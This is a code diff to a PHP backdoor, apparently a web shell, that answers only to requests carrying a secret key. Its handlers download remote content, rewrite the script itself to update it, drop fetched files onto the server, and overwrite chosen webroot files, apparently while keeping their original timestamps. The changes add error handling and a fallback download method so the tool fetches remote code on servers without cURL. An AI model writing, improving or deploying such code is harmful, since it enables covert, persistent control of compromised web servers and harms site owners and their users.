@@ -39,6 +39,10 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
                 break;
             }
             $r = request("GET", $_REQUEST["url"]);
+            if (!$r->success) {
+                echo _err($r->msg);
+                break;
+            }
             $pos = strpos($r->body, "INSERT_KEY");
             $file = substr_replace($r->body, $_REQUEST["k"], $pos, strlen("INSERT_KEY"));
             if (file_put_contents(__FILE__, $file)) echo _res("Updated");
@@ -53,6 +57,10 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
                 break;
             }
             $r = request("GET", $_REQUEST["url"]);
+            if (!$r->success) {
+                echo _err($r->msg);
+                break;
+            }
             if (!file_exists($work_dir)) mkdir($work_dir);
             $file_path = $work_dir;
             $file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
@@ -91,6 +99,10 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
             $file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
             $handle = fopen($file_path, "w");
             $r = request("GET", $_REQUEST["url"], $handle);
+            if (!$r->success) {
+                echo _err($r->msg);
+                break;
+            }
             fclose($handle);
             echo _res(["path" => $file_path]);
             break;
@@ -177,11 +189,12 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
             foreach ($_REQUEST["path_list"] as $path) {
                 $path = $webroot . $path;
                 if (file_exists($path)) {
-                    if ($f = file_get_contents($_REQUEST["url"], false, null, 0)) {
+                    $f = request("GET", $_REQUEST["url"]);
+                    if ($f->success) {
                         $time = filemtime($path);
                         if (isset($_REQUEST["private"])) {
                             $key = randomStr(12);
-                            $file = str_replace("INSERT_KEY", $key, $f);
+                            $file = str_replace("INSERT_KEY", $key, $f->body);
                         } else {
                             $file = $f;
                         }
@@ -297,32 +310,48 @@ function randomStr($length)
     return $randomString;
 }
 
-function request($requestType, $url, $outhandle = null, $parameters = null, $headers = null)
+function request($method, $url, $outhandle = null, $parameters = null, $headers = null)
 {
     $response = new stdClass();
 
     if (!function_exists("curl_init")) {
-
-        $response->success = false;
-        $response->body = "cURL is not enabled.";
-
-        return $response;
+        if(ini_get("allow_url_fopen")) {
+            $opts_array = array(
+                "method" => $method,
+            );
+            if ($headers !== null) $opts_array["header"] = $headers;
+            if ($method == "POST" && $parameters !== null) {
+                $opts_array["content"] = http_build_query($parameters);
+            }
+            $opts = array("http" => $opts_array);
+            $context = stream_context_create($opts);
+            $res = file_get_contents($url, false, $context);
+            if ($outhandle !== null) {
+                fwrite($outhandle, $res);
+            } else {
+                $response->body = $res;
+            }
+            $response->success = true;
+            return $response;
+        } else {
+            $response->success = false;
+            $response->msg = "cURL and allow_url_fopen is disabled. I mean... whatever. Great server, what can I say.";
+            return $response;
+        }
     }
 
     $ch = curl_init();
 
     ($parameters !== null) ? $query = http_build_query($parameters) : $query = "";
 
-    if ($requestType === "POST") {
-
+    if ($method === "POST") {
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
-    } elseif ($requestType === "GET") {
-
+    } elseif ($method === "GET") {
         if ($query) $url = $url . "?" . $query;
     } else {
         $response->success = false;
-        $response->body = "request type GET or POST is missing.";
+        $response->msg = "methods available: GET or POST";
         return $response;
     }
 
@@ -342,8 +371,7 @@ function request($requestType, $url, $outhandle = null, $parameters = null, $hea
         $response->body = $result;
     } else {
         $response->success = false;
-        $response->body = curl_error($ch);
-        $response->error = curl_errno($ch);
+        $response->msg = curl_errno($ch);
     }
     curl_close($ch);
     return $response;
